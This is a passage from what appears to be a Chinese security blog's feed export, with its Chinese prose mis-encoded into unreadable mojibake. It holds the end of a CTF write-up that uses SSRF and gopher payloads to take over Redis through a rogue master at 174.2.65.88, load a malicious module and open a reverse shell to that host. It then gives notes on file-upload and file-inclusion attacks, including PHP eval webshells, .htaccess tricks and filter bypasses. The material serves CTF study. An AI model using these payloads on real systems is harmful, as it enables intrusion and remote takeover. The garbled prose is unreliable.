<p>è¿™é‡Œcurlçš„ç›®æ ‡æ˜¯evil.com:80,php_url_parseå¤„ç†ç›®æ ‡æ˜¯google.comï¼Œè¿™é‡Œç”¨è¿™ç§å½¢å¼å¹¶æ²¡æœ‰æˆåŠŸè®¿é—®åˆ°hint.phpæ–‡ä»¶ï¼Œæ¢ç§æ–¹å¼ï¼Œç”¨0.0.0.0ä»£è¡¨æœ¬æœºæ‰€æœ‰çš„ipv4çš„åœ°å€</p>
<img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/2.png" class="">

<p>è¿™é‡Œæ‹¿åˆ°äº†redisçš„passä¸ºroot</p>
<p>ä¸‹é¢è¦ç”¨redisä¸»ä»å¤åˆ¶ï¼Œè¿™ç¯‡æ–‡ç« è¯¦ç»†ä»‹ç»äº†redisç§ssrfåˆ©ç”¨çš„æ–¹æ³•ï¼Œè¿™é‡Œè¦ç”¨åˆ°gopheråè®®</p>
<p>ä¸‹é¢å°±å¼€å§‹æ“ä½œï¼Œbuuä¸Šå¼€å°å†…ç½‘é¶æœºï¼Œä¸‹é¢æ˜¯ç½‘ä¸Šå«–çš„æµç¨‹å›¾</p>
<img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/3.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;éƒ½è¦äºŒæ¬¡urlç¼–ç </span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root</span><br><span class="line">config set dir &#x2F;tmp&#x2F;</span><br><span class="line">quit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250aconfig%2520set%2520dir%2520%252ftmp%252f%250aquit</span><br><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 174.2.65.88 6666</span><br><span class="line">quit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250aconfig%2520set%2520dbfilename%2520exp.so%250aslaveof%2520174.2.65.88%25206666%250aquit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root</span><br><span class="line">module load &#x2F;tmp&#x2F;exp.so</span><br><span class="line">system.rev 174.2.65.88 6663</span><br><span class="line">quit</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250amodule%2520load%2520&#x2F;tmp&#x2F;exp.so%250asystem.rev%2520174.2.65.88%25206663%250aquit</span><br></pre></td></tr></table></figure>

<p>åœ¨é¶æœºä¸Šèµ·ä¸€ä¸‹redisï¼Œè¿™é‡Œç”¨çš„æ˜¯<a href="https://github.com/xmsec/redis-ssrfçš„ä¼ªæœåŠ¡ï¼Œhttps://github.com/n0b0dyCN/redis-rogue-serverç”¨çš„è¿™é‡Œçš„exp.soæ–‡ä»¶" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrfçš„ä¼ªæœåŠ¡ï¼Œhttps://github.com/n0b0dyCN/redis-rogue-serverç”¨çš„è¿™é‡Œçš„exp.soæ–‡ä»¶</a></p>
<img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/4.png" class="">

<p>å°†ä¸Šé¢ä¸‰ä¸ªå‘½ä»¤æŒ¨ä¸ªä¼ ç»™urlå¹¶è®¿é—®ï¼Œå¹¶ä¸”åœ¨é¶æœºæ–°å¼€ä¸€ä¸ªé¡µé¢ç›‘å¬6663ç«¯å£ï¼Œè¿™æ—¶å€™å‘ç°æˆåŠŸå¼¹å›shellï¼Œä¸‹é¢å°±æ˜¯å¸¸è§„æ“ä½œï¼Œçœ‹ä¸€ä¸‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç›´æ¥è¯»flagæ–‡ä»¶</p>
<img src="/2020/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84SSRFMe/5.png" class="">

<p>æ”¶è·æå¤§ï¼Œè¿˜éœ€è¦å¥½å¥½æ¶ˆåŒ–2333</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <url>/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h4 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h4><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[fox])?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ"><a href="#å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ" class="headerlink" title="å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ"></a>å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ</h4><p>cmdåˆ¶ä½œ,è¿›å…¥å›¾ç‰‡æ‰€åœ¨ç›®å½•ï¼Œcopy xx.jpg/b+xx.php/a newxx.jpg<br>winhexåˆ¶ä½œ åœ¨æ–‡æœ¬æœ€åæ·»åŠ ä¸€å¥è¯æœ¨é©¬ï¼Œç¼–ç å¦å­˜ä¸ºæ–°å›¾ç‰‡</p>
<h4 id="å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š"><a href="#å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š" class="headerlink" title="å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š"></a>å…³äºæ–‡ä»¶æ ¼å¼è§£æï¼š</h4><p>æ¯ç§ç±»å‹çš„æ–‡ä»¶æ— æ³•è¯†åˆ«åˆ«çš„æ–‡ä»¶æ ¼å¼</p>
<h4 id="jséªŒè¯æœ¬åœ°ä¸Šä¼ "><a href="#jséªŒè¯æœ¬åœ°ä¸Šä¼ " class="headerlink" title="jséªŒè¯æœ¬åœ°ä¸Šä¼ "></a>jséªŒè¯æœ¬åœ°ä¸Šä¼ </h4><p>1.jsåˆ¤æ–­ä»£ç ä¸º:onsubmit = â€œreturn checkFile()â€<br>2.å¢åŠ å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹.php<br>3.æ‹·è´æºä»£ç ï¼Œåˆ é™¤åˆ¤æ–­ä»£ç ï¼Œåœ¨actionå¤„æŒ‡å®šä¸Šä¼ è·¯å¾„<br>4.ä¸Šä¼ å…è®¸ä¸Šä¼ çš„ä»£ç ï¼ŒæŠ“åŒ…æ”¹åŒ…</p>
<h4 id="MIMEç»•è¿‡"><a href="#MIMEç»•è¿‡" class="headerlink" title="MIMEç»•è¿‡:"></a>MIMEç»•è¿‡:</h4><p>ä¿®æ”¹content-typeå­—æ®µå¯ä»¥ä¸Šä¼ æŒ‡å®šçš„æ–‡ä»¶æ ¼å¼<br>æ–‡ä»¶æ‹“å±•é™åˆ¶:<br>å¤§å°å†™ç»•è¿‡æ–‡ä»¶ä¸Šä¼ ï¼ˆwidnowsä¸‹æ–‡ä»¶ä¸åŒºåˆ†å¤§å°å†™ linuxåŒºåˆ†ï¼‰<br>.ç©ºæ ¼ç»•è¿‡.php.,.phpç©ºæ ¼éƒ½è§£æä¸º.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccessæ–‡ä»¶ä»£ç :</span><br><span class="line">&lt;Filesmatch&quot;fox&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">æŠŠæ–‡ä»¶åä¸ºfoxçš„æ–‡ä»¶å…¨éƒ½ä»¥phpè¿è¡Œ(å…ˆä¸Šä¼ .htaccessæ–‡ä»¶å†ä¸Šä¼ æ–‡ä»¶)</span><br></pre></td></tr></table></figure>

<h4 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="::$DATAç»•è¿‡"></a>::$DATAç»•è¿‡</h4><h4 id="Apacheè§£ææ¼æ´-è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1-php-xxx-1-php"><a href="#Apacheè§£ææ¼æ´-è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1-php-xxx-1-php" class="headerlink" title="Apacheè§£ææ¼æ´,è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1.php.xxx=1.php"></a>Apacheè§£ææ¼æ´,è¯»å–æ–‡ä»¶æ—¶ä»å³å¾€å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œè‹¥é‡åˆ°ä¸å¯è§£æçš„æ–‡ä»¶ååˆ™è·³è¿‡ã€‚1.php.xxx=1.php</h4><h4 id="å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ "><a href="#å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ :"></a>å†…å®¹éªŒè¯æ–‡ä»¶ä¸Šä¼ :</h4><p>æ–‡ä»¶å¤´ä¸Šä¼ ç»•è¿‡ï¼Œåœ¨ä¸€å¥è¯æœ¨é©¬phpæ–‡ä»¶å‰é¢åŠ ä¸Šjpgï¼Œpngï¼Œgifå›¾ç‰‡æ–‡ä»¶çš„å¼€å¤´å¯ä»¥ç»•è¿‡æ£€æµ‹</p>
<h4 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­:"></a>%00æˆªæ–­:</h4><p>0x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯asciiç ä¸º0çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“ä½œç»“æŸç¬¦ï¼Œå¯ç”¨äºå¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡<br>getå¯ä»¥è‡ªåŠ¨è½¬æ¢ï¼Œpostéœ€è¦ç‰¹æ®Šè½¬æ¢ï¼ˆé€‰ä¸­è¿›è¡Œurlæ ¼å¼è½¬æ¢ï¼‰</p>
<h4 id="iis6-0è§£ææ¼æ´"><a href="#iis6-0è§£ææ¼æ´" class="headerlink" title="iis6.0è§£ææ¼æ´"></a>iis6.0è§£ææ¼æ´</h4><p>1.ç›®å½•è§£æ<br>ä»¥<em>.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½ä¼šè¢«å½“æˆaspæ–‡ä»¶æ‰§è¡Œ<br>æ¯”å¦‚1.asp/1.jpgï¼Œ1.jpgä¼šè¢«å½“åšaspæ–‡ä»¶æ‰§è¡Œ<br>2.æ–‡ä»¶è§£æ<br>*.asp;.jpgåœ¨;åé¢çš„è¢«ç›´æ¥å¿½ç•¥ï¼Œå½“æˆ</em>.aspæ–‡ä»¶æ‰§è¡Œ</p>
<h4 id="ç¼–è¾‘å™¨æ¼æ´"><a href="#ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´:"></a>ç¼–è¾‘å™¨æ¼æ´:</h4><p>1.ä¸éœ€è¦åå°éªŒè¯ç›´æ¥å¯ä»¥è¿›è¡Œæ“ä½œ(å¾¡å‰‘æ‰«æè¿›è¡Œç›®æ ‡çˆ†ç ´)<br>2.éœ€è¦åå°ç®¡ç†ç™»å½•æ‰èƒ½å¤Ÿæ“ä½œ<br>å¸¸ç”¨çš„ç¼–è¾‘å™¨:FCKeditor,EWEbeditor,CKFinder,UEDITOR<br>FCKeditor:çªç ´å»ºç«‹æ–‡ä»¶å¤¹,å®è´¨æ˜¯åˆ©ç”¨iis6çš„ç›®å½•è§£æ<br>EWEbeditoréå†æ¼æ´<br>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=../</p>
<h4 id="iis7-0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´"><a href="#iis7-0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´" class="headerlink" title="iis7.0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´"></a>iis7.0ä»¥ä¸Šé«˜ç‰ˆæœ¬æ¼æ´</h4><p>1.jpg/.phpï¼Œåœ¨1.jpgä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå› ä¸º.phpä¸å­˜åœ¨ä½†æ˜¯ä¼šç”¨phpæ¥è§£æï¼Œå°±ä¼šè¯»å–1.jpgï¼Œè¿™å…¶ä¸­çš„ä¸€å¥è¯å°±ä¼šè¢«æ‰§è¡Œ</p>
<h3 id="å¸¸è§æ–‡ä»¶å¤´"><a href="#å¸¸è§æ–‡ä»¶å¤´" class="headerlink" title="å¸¸è§æ–‡ä»¶å¤´"></a>å¸¸è§æ–‡ä»¶å¤´</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JPEG (jpg)ï¼Œ             ã€€æ–‡ä»¶å¤´ï¼šFFD8FFã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line">PNG (png)ï¼Œ            ã€€ã€€ æ–‡ä»¶å¤´ï¼š89504E47 æ–‡ä»¶å°¾ï¼š0000000049454E44AE426082</span><br><span class="line">GIF (gif)ï¼Œ              ã€€ã€€æ–‡ä»¶å¤´ï¼š47494638</span><br><span class="line">ZIP Archive (zip)ï¼Œ           æ–‡ä»¶å¤´ï¼š504B0304 æ–‡ä»¶å°¾ï¼š00000000</span><br><span class="line">TIFF (tif)ï¼Œ              ã€€  æ–‡ä»¶å¤´ï¼š49492A00</span><br><span class="line">Windows Bitmap (bmp)ï¼Œ      æ–‡ä»¶å¤´ï¼š424D</span><br><span class="line">CAD (dwg)ï¼Œ               æ–‡ä»¶å¤´ï¼š41433130</span><br><span class="line">Adobe Photoshop (psd)ï¼Œ      æ–‡ä»¶å¤´ï¼š38425053</span><br><span class="line">Rich Text Format (rtf)ï¼Œ       æ–‡ä»¶å¤´ï¼š7B5C727466</span><br><span class="line">XML (xml)ï¼Œ                æ–‡ä»¶å¤´ï¼š3C3F786D6C</span><br><span class="line">HTML (html)ï¼Œ              æ–‡ä»¶å¤´ï¼š68746D6C3E</span><br><span class="line">Email [thorough only] (eml)ï¼Œ   æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)ï¼Œ       æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)ï¼Œ             æ–‡ä»¶å¤´ï¼š2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)ï¼Œ    æ–‡ä»¶å¤´ï¼šD0CF11E0</span><br><span class="line">MS Access (mdb)ï¼Œ           æ–‡ä»¶å¤´ï¼š5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)ï¼Œ          æ–‡ä»¶å¤´ï¼šFF575043</span><br><span class="line">Adobe Acrobat (pdf)ï¼Œ        æ–‡ä»¶å¤´ï¼š255044462D312E</span><br><span class="line">Quicken (qdf)ï¼Œ             æ–‡ä»¶å¤´ï¼šAC9EBD8F</span><br><span class="line">Windows Password (pwl)ï¼Œ     æ–‡ä»¶å¤´ï¼šE3828596</span><br><span class="line">RAR Archive (rar)ï¼Œ           æ–‡ä»¶å¤´ï¼š52617221</span><br><span class="line">Wave (wav)ï¼Œ               æ–‡ä»¶å¤´ï¼š57415645</span><br><span class="line">AVI (avi)ï¼Œ                 æ–‡ä»¶å¤´ï¼š41564920</span><br><span class="line">Real Audio (ram)ï¼Œ           æ–‡ä»¶å¤´ï¼š2E7261FD</span><br><span class="line">Real Media (rm)ï¼Œ            æ–‡ä»¶å¤´ï¼š2E524D46</span><br><span class="line">MPEG (mpg)ï¼Œ              æ–‡ä»¶å¤´ï¼š000001BA</span><br><span class="line">MPEG (mpg)ï¼Œ              æ–‡ä»¶å¤´ï¼š000001B3</span><br><span class="line">Quicktime (mov)ï¼Œ           æ–‡ä»¶å¤´ï¼š6D6F6F76</span><br><span class="line">Windows Media (asf)ï¼Œ        æ–‡ä»¶å¤´ï¼š3026B2758E66CF11</span><br><span class="line">MIDI (mid)ï¼Œ                æ–‡ä»¶å¤´ï¼š4D546864</span><br></pre></td></tr></table></figure>



<h3 id="éƒ¨åˆ†MIMEè¡¨"><a href="#éƒ¨åˆ†MIMEè¡¨" class="headerlink" title="éƒ¨åˆ†MIMEè¡¨"></a>éƒ¨åˆ†MIMEè¡¨</h3><table>
<thead>
<tr>
<th><code>.aac</code></th>
<th align="center">AAC audio</th>
<th><code>audio/aac</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>.abw</code></td>
<td align="center"><a href="https://en.wikipedia.org/wiki/AbiWord" target="_blank" rel="noopener">AbiWord</a> document</td>
<td><code>application/x-abiword</code></td>
</tr>
<tr>
<td><code>.arc</code></td>
<td align="center">Archive document (multiple files embedded)</td>
<td><code>application/x-freearc</code></td>
</tr>
<tr>
<td><code>.avi</code></td>
<td align="center">AVI: Audio Video Interleave</td>
<td><code>video/x-msvideo</code></td>
</tr>
<tr>
<td><code>.azw</code></td>
<td align="center">Amazon Kindle eBook format</td>
<td><code>application/vnd.amazon.ebook</code></td>
</tr>
<tr>
<td><code>.bin</code></td>
<td align="center">Any kind of binary data</td>
<td><code>application/octet-stream</code></td>
</tr>
<tr>
<td><code>.bmp</code></td>
<td align="center">Windows OS/2 Bitmap Graphics</td>
<td><code>image/bmp</code></td>
</tr>
<tr>
<td><code>.bz</code></td>
<td align="center">BZip archive</td>
<td><code>application/x-bzip</code></td>
</tr>
<tr>
<td><code>.bz2</code></td>
<td align="center">BZip2 archive</td>
<td><code>application/x-bzip2</code></td>
</tr>
<tr>
<td><code>.csh</code></td>
<td align="center">C-Shell script</td>
<td><code>application/x-csh</code></td>
</tr>
<tr>
<td><code>.css</code></td>
<td align="center">Cascading Style Sheets (CSS)</td>
<td><code>text/css</code></td>
</tr>
<tr>
<td><code>.csv</code></td>
<td align="center">Comma-separated values (CSV)</td>
<td><code>text/csv</code></td>
</tr>
<tr>
<td><code>.doc</code></td>
<td align="center">Microsoft Word</td>
<td><code>application/msword</code></td>
</tr>
<tr>
<td><code>.docx</code></td>
<td align="center">Microsoft Word (OpenXML)</td>
<td><code>application/vnd.openxmlformats-officedocument.wordprocessingml.document</code></td>
</tr>
<tr>
<td><code>.gif</code></td>
<td align="center">Graphics Interchange Format (GIF)</td>
<td><code>image/gif</code></td>
</tr>
<tr>
<td><code>.htm.html</code></td>
<td align="center">HyperText Markup Language (HTML)</td>
<td><code>text/html</code></td>
</tr>
<tr>
<td><code>.jpeg</code> <code>.jpg</code></td>
<td align="center">JPEG images</td>
<td><code>image/jpeg</code></td>
</tr>
<tr>
<td><code>.js</code></td>
<td align="center">JavaScript</td>
<td><code>text/javascript</code></td>
</tr>
<tr>
<td><code>.json</code></td>
<td align="center">JSON format</td>
<td><code>application/json</code></td>
</tr>
<tr>
<td><code>.mp3</code></td>
<td align="center">MP3 audio</td>
<td><code>audio/mpeg</code></td>
</tr>
<tr>
<td><code>.png</code></td>
<td align="center">Portable Network Graphics</td>
<td><code>image/png</code></td>
</tr>
<tr>
<td><code>.pdf</code></td>
<td align="center">Adobe <a href="https://acrobat.adobe.com/us/en/why-adobe/about-adobe-pdf.html" target="_blank" rel="noopener">Portable Document Format</a> (PDF)</td>
<td><code>application/pdf</code></td>
</tr>
<tr>
<td><code>.ppt</code></td>
<td align="center">Microsoft PowerPoint</td>
<td><code>application/vnd.ms-powerpoint</code></td>
</tr>
<tr>
<td><code>.sh</code></td>
<td align="center">Bourne shell script</td>
<td><code>application/x-sh</code></td>
</tr>
<tr>
<td><code>.svg</code></td>
<td align="center">Scalable Vector Graphics (SVG)</td>
<td><code>image/svg+xml</code></td>
</tr>
<tr>
<td><code>tif.tiff</code></td>
<td align="center">Tagged Image File Format (TIFF)</td>
<td><code>image/tiff</code></td>
</tr>
<tr>
<td><code>.txt</code></td>
<td align="center">Text, (generally ASCII or ISO 8859-<em>n</em>)</td>
<td><code>text/plain</code></td>
</tr>
<tr>
<td><code>.xml</code></td>
<td align="center"><code>XML</code></td>
<td><code>application/xml</code> ä»£ç å¯¹æ™®é€šç”¨æˆ·æ¥è¯´ä¸å¯è¯» (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3) <code>text/xml</code> ä»£ç å¯¹æ™®é€šç”¨æˆ·æ¥è¯´å¯è¯» (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3)</td>
</tr>
</tbody></table>
<h4 id="åè®°ï¼šç™¾åº¦æ¯upload"><a href="#åè®°ï¼šç™¾åº¦æ¯upload" class="headerlink" title="åè®°ï¼šç™¾åº¦æ¯upload"></a>åè®°ï¼šç™¾åº¦æ¯upload</h4><p>ä¸ºä½•å¯ä»¥ç›´æ¥ä¸Šä¼ åç¼€ä¸º pht æˆ– phtml ç»•è¿‡é»‘åå•å‘¢ï¼Ÿ</p>
<p>phpçš„confæ–‡ä»¶ä¸­æ˜¯æœ‰ä¸€ä¸ªæ­£åˆ™çš„åç¼€åé™åˆ¶çš„ï¼Œåªè¦ç¬¦åˆéƒ½å¯ä»¥è¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚</p>
<p>ç¬¦åˆçš„åç¼€åŒ…æ‹¬ phpã€php3ã€php4ã€php5ã€phtmlã€pht ç­‰ã€‚</p>
<p>ä»€ä¹ˆç¯å¢ƒä¸‹å¯ä»¥è§£æ phtml å’Œ pht å‘¢ï¼Ÿ</p>
<p>1ï¼Œphpstudyå’Œwampä»¥åŠcentosç”¨yumæ–¹å¼ å®‰è£…çš„lampç¯å¢ƒä¸èƒ½è§£æphtmlå’Œpht</p>
<p>2ï¼Œubuntuå’Œdebianåˆ©ç”¨apt-getæ–¹å¼å®‰è£…çš„lampç¯å¢ƒ å°±èƒ½è§£æphtmlå’Œpht</p>
<p>åˆ©ç”¨è¿™äº›ç¯å¢ƒç‰¹æ€§å’Œé»‘åå•å°±èƒ½ç»•è¿‡é™åˆ¶ï¼Œè¾¾åˆ°ä¸Šä¼ webshellçš„ç›®çš„ã€‚</p>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h4 id="phpæ–‡ä»¶åŒ…å«çš„å½¢å¼"><a href="#phpæ–‡ä»¶åŒ…å«çš„å½¢å¼" class="headerlink" title="phpæ–‡ä»¶åŒ…å«çš„å½¢å¼"></a>phpæ–‡ä»¶åŒ…å«çš„å½¢å¼</h4><p>&lt;?php<br>    $file = $_GET[â€˜fileâ€™];<br>    if(isset($file)){<br>    include(â€œ$fileâ€);<br>    //require();<br>    //require_once();<br>    //include_once();<br>    }else{<br>        echo â€œfile failâ€<br>    }</p>
<h4 id="phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š"><a href="#phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š" class="headerlink" title="phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š"></a>phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š</h4><p>include()<br>include_once()<br>require()<br>require_once()<br>æ³¨ï¼šrequire()å¦‚æœåœ¨åŒ…å«è¿‡ç¨‹ä¸­å‡ºé”™ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸å­˜åœ¨ç­‰ï¼Œä¼šç›´æ¥é€€å‡ºä¸æ‰§è¡Œåç»­è¯­å¥.<br>include()å¦‚æœå‡ºé”™ä¼šæå‡ºè­¦å‘Šï¼Œåç»­è¯­å¥ä¼šç»§ç»­æ‰§è¡Œ<br>æ–‡ä»¶åŒ…å«æ¼æ´çš„åœºæ™¯:<br>1.å…·æœ‰ç›¸å…³çš„æ–‡ä»¶åŒ…å«å‡½æ•°<br>2.æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­å­˜åœ¨åŠ¨æ€å˜é‡ï¼Œæ¯”å¦‚include $file;.<br>3.æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¯¥å˜é‡,æ¯”å¦‚$file = $_GET[â€˜fileâ€™];.</p>
<h4 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»:"></a>åˆ†ç±»:</h4><p>1.LFI(Local File Inclusion)<br>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒæŒ‡èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹é‡åˆ°çš„éƒ½æ˜¯æœ¬åœ°åŒ…å«ã€‚<br>2.RFI(Remote File Inclusion)<br>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåªèƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œç”±äºè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´æ˜¯æˆ‘ä»¬å¯æ§çš„<br>ï¼Œå› æ­¤æ¼æ´ä¸€æ—¦å­˜åœ¨å±å®³å°±å¾ˆå¤§åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œéœ€è¦PHP.INIä¸­è¿›è¡Œé…ç½®<br>1.allow_url_fopen = On<br>2.allow_url_include = On</p>
<h3 id="åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……"><a href="#åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……" class="headerlink" title="åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……:"></a>åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……:</h3><p>å¯ä»¥çˆ†å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="actionscript">system(<span class="string">"ls"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>allow_url_includeä¸ºOnï¼Œç”¨<a href="php://input">php://input</a>ä¼ªåè®®è¿›è¡ŒåŒ…å«</p>
<p>php://filter/read=convert.base64-encode/recource=index.php;</p>
<p>è¿™å¥è¯çš„æ„æ€æ˜¯æˆ‘ä»¬ç”¨base64ç¼–ç çš„æ–¹å¼æ¥è¯»æ–‡ä»¶index.phpï¼›</p>
<p>è‹¥åå°ä»£ç è¿‡æ»¤äº†&lt;?å’Œphpå…³é”®å­—å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡phpå…³é”®å­—ï¼Œç”¨HTMLç»•è¿‡&lt;?</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'sb'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é‡æ–°æ ¹æ®upload-labs-masteråšçš„æ•´ç†ï¼š</p>
